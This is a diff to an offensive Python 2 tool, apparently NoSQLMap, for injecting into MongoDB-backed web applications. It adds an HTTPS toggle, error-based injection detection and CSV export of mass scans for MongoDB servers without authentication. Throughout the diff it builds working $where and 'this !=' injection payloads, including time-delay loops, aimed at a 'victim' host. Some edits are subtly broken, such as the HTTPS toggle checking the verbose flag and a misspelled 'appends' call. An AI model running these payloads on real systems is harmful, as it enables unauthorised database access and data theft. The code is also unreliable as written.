@@ -37,7 +37,7 @@ from threading import Thread
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
-optionSet = [False,False,False,False,False,False,False,False]
+optionSet = [False,False,False,False,False,False,False,False,False]
 global yes_tag
 global no_tag
 yes_tag = ['y', 'Y']
@@ -46,6 +46,7 @@ global victim
 global webPort
 global uri
 global httpMethod
+global https
 global myIP
 global myPort
 global verb
@@ -116,6 +117,7 @@ def options():
 	global victim
 	global webPort
 	global uri
+	global https
 	global httpMethod
 	global postData
 	global myIP
@@ -147,6 +149,9 @@ def options():
 	if optionSet[6] == False:
 		verb = "OFF"
 		optSelect = True
+	if optionSet[8] == False:
+		https = "OFF"
+		optSelect = True
 	
 	while optSelect:	
 		print "\n\n"
@@ -154,14 +159,15 @@ def options():
 		print "1-Set target host/IP (Current: " + str(victim) + ")"
 		print "2-Set web app port (Current: " + str(webPort) + ")" 
 		print "3-Set App Path (Current: " + str(uri) + ")"
-		print "4-Set MongoDB Port (Current : " + str(dbPort) + ")"
-		print "5-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
-		print "6-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
-		print "7-Set shell listener port (Current: " + str(myPort) + ")"
-		print "8-Toggle Verbose Mode: (Current: " + str(verb) + ")"
-		print "9-Load options file"
-		print "0-Load options from saved Burp request"
-		print "a-Save options file"
+		print "4-Toggle HTTPS (Current: " + str(https) + ")"
+		print "5-Set MongoDB Port (Current : " + str(dbPort) + ")"
+		print "6-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
+		print "7-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
+		print "8-Set shell listener port (Current: " + str(myPort) + ")"
+		print "9-Toggle Verbose Mode: (Current: " + str(verb) + ")"
+		print "0-Load options file"
+		print "a-Load options from saved Burp request"
+		print "b-Save options file"
 		print "x-Back to main menu"
 
 		select = raw_input("Select an option: ")
@@ -209,13 +215,25 @@ def options():
 			uri = raw_input("Enter URI Path (Press enter for no URI): ")
 			print "\nURI Path set to " + uri + "\n"
 			optionSet[2] = True
-		
+			
 		elif select == "4":
+			if https == "OFF":
+				print "HTTPS enabled."
+				https = "ON"
+				optionSet[8] = True
+			
+			elif verb == "ON":
+				print "HTTPS disabled."
+				https = "OFF"
+				optionSet[8] = True
+			
+		
+		elif select == "5":
 			dbPort = int(raw_input("Enter target MongoDB port: "))
 			print "\nTarget Mongo Port set to " + str(dbPort) + "\n"
 			optionSet[7] = True
 
-		elif select == "5":
+		elif select == "6":
 			httpMethod = True
 			while httpMethod == True:
 
@@ -240,7 +258,7 @@ def options():
 				else:
 					print "Invalid selection"
 
-		elif select == "6":
+		elif select == "7":
 			#Unset the setting boolean since we're setting it again.
 			optionSet[4] = False
 			goodLen = False
@@ -272,12 +290,12 @@ def options():
 					print "\nShell/DB listener set to " + myIP + "\n"
 					optionSet[4] = True
 		
-		elif select == "7":
+		elif select == "8":
 			myPort = raw_input("Enter TCP listener for shells: ")
 			print "Shell TCP listener set to " + myPort + "\n"
 			optionSet[5] = True
 		
-		elif select == "8":
+		elif select == "9":
 			if verb == "OFF":
 				print "Verbose output enabled."
 				verb = "ON"
@@ -288,7 +306,7 @@ def options():
 				verb = "OFF"
 				optionSet[6] = True
 			
-		elif select == "9":
+		elif select == "0":
 			loadPath = raw_input("Enter file name to load: ")
 			try:
 				fo = open(loadPath,"r" )
@@ -314,7 +332,7 @@ def options():
 			except:
 				print "Couldn't load options file!"
 		
-		elif select == "0":
+		elif select == "a":
 			loadPath = raw_input("Enter path to Burp request file: ")
 
 			try:
@@ -353,7 +371,7 @@ def options():
 			uri = methodPath[1].replace("\r\n","")
 			optionSet[2] = True			
 			
-		elif select == "a":
+		elif select == "b":
 			savePath = raw_input("Enter file name to save: ")
 			try:
 				fo = open(savePath, "wb")
@@ -578,7 +596,11 @@ def postApps():
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
-	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	if https == "OFF":
+		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	
+	elif https == "ON":
+		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 	
 	try:
 		body = urllib.urlencode(postData)
@@ -660,9 +682,15 @@ def postApps():
 		else:
 			print "Test 1: PHP associative array injection"
 
-		injLen = int(len(urllib2.urlopen(req).read()))			
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))			
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum +=1
 		print "\n"
 		
 		#Delete the extra key
@@ -677,9 +705,15 @@ def postApps():
 		else:
 			print "Test 2: $where injection (string escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
+		
 		print "\n"
 		
 		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
@@ -691,9 +725,14 @@ def postApps():
 		else:
 			print "Test 3: $where injection (integer escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 		print "\n"
 
 		#Start a single record attack in case the app expects only one record back
@@ -707,9 +746,15 @@ def postApps():
 		else:
 			print "Test 4: $where injection string escape (single record)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
@@ -722,9 +767,15 @@ def postApps():
 		else:
 			print "Test 5: $where injection integer escape (single record)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
@@ -738,11 +789,16 @@ def postApps():
 		else:
 			print "Test 6: This != injection (string escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-		print "\n"
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
 		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+			print "\n"
+		else:
+			testNum += 1
+			
 		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -753,9 +809,15 @@ def postApps():
 		else:
 			print "Test 7:  This != injection (integer escape)"
 		
-		injLen = int(len(urllib2.urlopen(req).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib2.urlopen(req).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib2.urlopen(req).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
+			testNum += 1
 		print "\n"
 		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
@@ -877,8 +939,11 @@ def getApps():
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
 	
-	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
+	if https == "OFF":
+		appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
 	
+	elif https == "ON":
+		appURL = "https://" + str(victim) + ":" + str(webPort) + str(uri)
 	try:
 		appRespCode = urllib.urlopen(appURL).getcode()
 		if appRespCode == 200:
@@ -932,13 +997,16 @@ def getApps():
 			print "Test 1: PHP associative array injection"
 			
 		#Test for errors returned by injection
-		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()))
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[1]).read()),testNum)
 		
-		injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-		print "\n"
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 
+		print "\n"
 		if verb == "ON":
 			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
 			print "Injecting " + uriArray[2]
@@ -946,20 +1014,15 @@ def getApps():
 			print "Test 2: $where injection (string escape)"
 		
 		
-		errorCheck = str(urllib.urlopen(uriArray[2]).read())
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[2]).read()),testNum)
 		
-		if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
-			if verb == "ON":
-				print "Injection returned a verbose error from the application.  Injection may be possible."
-				possAddrs.append(uriArray[2])
 			
-			else:
-				print "Possible injection."
-				possAddrs.append(uriArray[2])
-			
-		else:		
+		if errorCheck == False:		
 			injLen = int(len(urllib.urlopen(uriArray[2]).read()))
 			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		
+		else:
 			testNum += 1
 		
 		print "\n"
@@ -969,16 +1032,15 @@ def getApps():
 		else:
 			print "Test 3:  $where injection (integer escape)"
 		
-		errorCheck = str(urllib.urlopen(uriArray[3]).read())
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[3]).read()),testNum)
 		
-		if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
-			if verb == "ON":
-				print "Injection returned a verbose error from the application.  Injection may be possible."
-				possAddrs.append(uriArray[3])
 		
-		else:
+		if errorCheck == False:
 			injLen = int(len(urllib.urlopen(uriArray[3]).read()))
 			checkResult(randLength,injLen,testNum)
+			testNum +=1
+		
+		else:
 			testNum +=1
 				
 		#Start a single record attack in case the app expects only one record back
@@ -990,9 +1052,14 @@ def getApps():
 			print "Test 4: $where injection string escape (single record)"
 		
 		
-		injLen = int(len(urllib.urlopen(uriArray[4]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[4]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[4]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 				
 		print "\n"
 		if verb == "ON":
@@ -1001,9 +1068,15 @@ def getApps():
 		else:
 			print "Test 5: $where injection integer escape (single record)"
 		
-		injLen = int(len(urllib.urlopen(uriArray[5]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum +=1
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[5]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[5]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum +=1
+		
+		else:
+			testNum += 1
 			
 		print "\n"
 		if verb == "ON":
@@ -1011,9 +1084,15 @@ def getApps():
 			print " Injecting " + uriArray[6]
 		else:
 			print "Test 6: This != injection (string escape)"
-		injLen = int(len(urllib.urlopen(uriArray[6]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
+			
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[6]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[6]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 			
 		print "\n"
 		if verb == "ON":
@@ -1021,11 +1100,17 @@ def getApps():
 			print " Injecting " + uriArray[7]
 		else:
 			print "Test 7: This != injection (integer escape)"
-		injLen = int(len(urllib.urlopen(uriArray[7]).read()))
-		checkResult(randLength,injLen,testNum)
-		testNum += 1
-			
+		
+		errorCheck = errorTest(str(urllib.urlopen(uriArray[7]).read()),testNum)
+		
+		if errorCheck == False:
+			injLen = int(len(urllib.urlopen(uriArray[7]).read()))
+			checkResult(randLength,injLen,testNum)
+			testNum += 1
+		else:
+			testNum += 1
 		print "\n"
+		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
 		if doTimeAttack in yes_tag:
@@ -1119,12 +1204,28 @@ def getApps():
 	raw_input("Press enter to continue...")
 	return()
 
-def errorTest (errorCheck):
+def errorTest (errorCheck,testNum):
 	global possAddrs
+	global httpMethod
+	global neDict
+	global postData
 	
 	if errorCheck.find('ReferenceError') != -1 or errorCheck.find('SyntaxError') != -1 or errorCheck.find('ILLEGAL') != -1:
-		print "some crap"
+		print "Injection returned a MongoDB Error.  Injection may be possible."
 		
+		if httpMethod == "GET":
+			possAddrs.append(uriArray[testNum])
+			return True
+		
+		else:
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+				return True
+			else:
+				possAddrs.appends(str(postData))
+				return True
+	else:
+		return False
 		
 	
 
@@ -1297,11 +1398,11 @@ def buildUri(origUri, randValue):
 			uriArray[7] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
 			uriArray[8] += paramName[x] + "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!" + "&"
 			uriArray[9] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
-			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
-			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
+			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy='!" + "&"
+			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy='!" + "&"
 			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
 			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
-			uriArray[14] += paramName[x] + "a'; return true; var dum=a'"
+			uriArray[14] += paramName[x] + "a'; return true; var dum='a"
 			uriArray[15] += paramName[x] + "1; return true; var dum=2"
 			#Add values that can be manipulated for database attacks
 			uriArray[16] += paramName[x] + "=a\'; ---"
@@ -1528,10 +1629,34 @@ def massMongo():
 		elif result[0] == 4:
 			print target.rstrip() + " didn't respond to ping."
 
-
+	
 	print "\n\n"
+	select = True
+	while select:
+		saveEm = raw_input("Save scan results to CSV? (y/n):")
+		
+		if saveEm in yes_tag:
+			savePath = raw_input("Enter file name to save: ")
+			outCounter = 0
+			try:
+				fo = open(savePath, "wb")
+				for server in success:
+					fo.write(server + "," + versions[outCounter] + "\n" )
+					outCounter += 1				
+					
+				fo.close()
+				print "Scan results saved!"
+				select = False
+			except:
+				print "Couldn't save scan results."
+			
+		elif saveEm in no_tag:
+			select = False
+		else:
+			select = True
+			
 	print "Discovered MongoDB Servers with No Auth:"
-	print "IP" + "\t" + "Version"
+	print "IP" + " " + "Version"
 	
 	outCounter= 1
 	
